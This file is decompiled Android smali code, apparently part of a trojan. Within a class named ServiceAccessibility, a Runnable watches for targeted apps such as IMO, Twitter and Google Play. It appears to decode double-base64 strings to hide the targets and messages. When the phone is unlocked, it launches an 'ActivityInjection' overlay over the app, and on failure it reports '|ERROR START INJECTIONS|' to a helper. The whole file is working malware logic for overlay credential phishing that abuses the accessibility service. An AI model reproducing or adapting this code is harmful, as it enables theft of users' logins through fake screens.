.class Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lnaqsl/ebxcb/exu/ServiceAccessibility;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic fddo:Ljava/lang/String;

.field final synthetic for:Ljava/lang/String;

.field final synthetic ifdf:Landroid/content/Context;

.field final synthetic int:Lnaqsl/ebxcb/exu/ServiceAccessibility;


# direct methods
.method constructor <init>(Lnaqsl/ebxcb/exu/ServiceAccessibility;Ljava/lang/String;Landroid/content/Context;Ljava/lang/String;)V
    .registers 5

    iput-object p1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iput-object p2, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->fddo:Ljava/lang/String;

    iput-object p3, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->ifdf:Landroid/content/Context;

    iput-object p4, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->for:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 9

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->fddo:Ljava/lang/String;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v1, v1, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "WTI5dExtbHRieTVoYm1SeWIybGtMbWx0YjJsdExHTnZiUzUwZDJsMGRHVnlMbUZ1WkhKdmFXUT0="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_34

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v2, v2, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v2, v2, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v2, "WTI5dExtbHRieTVoYm1SeWIybGtMbWx0YjJsdExHTnZiUzUwZDJsMGRHVnlMbUZ1WkhKdmFXUXNZMjl0TG1GdVpISnZhV1F1ZG1WdVpHbHVadz09"

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    :cond_34
    const-string v1, ""

    if-eq v0, v1, :cond_142

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v1, v1, Lnaqsl/ebxcb/exu/ServiceAccessibility;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->ifdf:Landroid/content/Context;

    invoke-virtual {v1, v2}, Lnaqsl/ebxcb/exu/int;->catch(Landroid/content/Context;)Z

    move-result v1

    if-eqz v1, :cond_142

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->for:Ljava/lang/String;

    const/4 v2, 0x0

    const/4 v3, 0x0

    move-object v4, v2

    const/4 v2, 0x0

    :goto_4a
    iget-object v5, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v5, v5, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v5, "THc9PQ=="

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v6

    array-length v6, v6

    if-ge v2, v6, :cond_9b

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v6, v6, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    aget-object v5, v5, v2

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v6, v6, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "TEE9PQ=="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    const/4 v6, 0x1

    :goto_84
    array-length v7, v5

    if-ge v6, v7, :cond_95

    aget-object v7, v5, v6

    invoke-virtual {v1, v7}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_92

    aget-object v4, v5, v3

    goto :goto_95

    :cond_92
    add-int/lit8 v6, v6, 0x1

    goto :goto_84

    :cond_95
    :goto_95
    if-eqz v4, :cond_98

    goto :goto_9b

    :cond_98
    add-int/lit8 v2, v2, 0x1

    goto :goto_4a

    :cond_9b
    :goto_9b
    if-eqz v4, :cond_142

    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    const-string v1, "keyguard"

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    invoke-virtual {v0}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v0

    if-nez v0, :cond_142

    :try_start_ad
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->ifdf:Landroid/content/Context;

    const-class v2, Lnaqsl/ebxcb/exu/Activity/ActivityInjection;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v1, v1, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v1, v1, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v1, "YzNSeQ=="

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x800000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    iget-object v1, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->startActivity(Landroid/content/Intent;)V
    :try_end_e0
    .catch Ljava/lang/Exception; {:try_start_ad .. :try_end_e0} :catch_e1

    goto :goto_142

    :catch_e1
    iget-object v0, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v1, v0, Lnaqsl/ebxcb/exu/ServiceAccessibility;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v2, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->ifdf:Landroid/content/Context;

    iget-object v0, v0, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v0, "TkE9PQ=="

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v4, v4, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v4, "Y0QwPQ=="

    invoke-static {v4}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v4, v4, Lnaqsl/ebxcb/exu/ServiceAccessibility;->fddo:Lnaqsl/ebxcb/exu/int;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v6, v6, Lnaqsl/ebxcb/exu/ServiceAccessibility;->fddo:Lnaqsl/ebxcb/exu/int;

    iget-object v7, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->ifdf:Landroid/content/Context;

    invoke-virtual {v6, v7}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v6, p0, Lnaqsl/ebxcb/exu/ServiceAccessibility$fddo;->int:Lnaqsl/ebxcb/exu/ServiceAccessibility;

    iget-object v6, v6, Lnaqsl/ebxcb/exu/ServiceAccessibility;->ifdf:Lnaqsl/ebxcb/exu/int;

    const-string v6, "ZkVWU1VrOVNJRk5VUVZKVUlFbE9Ta1ZEVkVsUFRsTjg="

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnaqsl/ebxcb/exu/int;->int(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Lnaqsl/ebxcb/exu/int;->for(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v0, v3}, Lnaqsl/ebxcb/exu/int;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    :cond_142
    :goto_142
    return-void
.end method
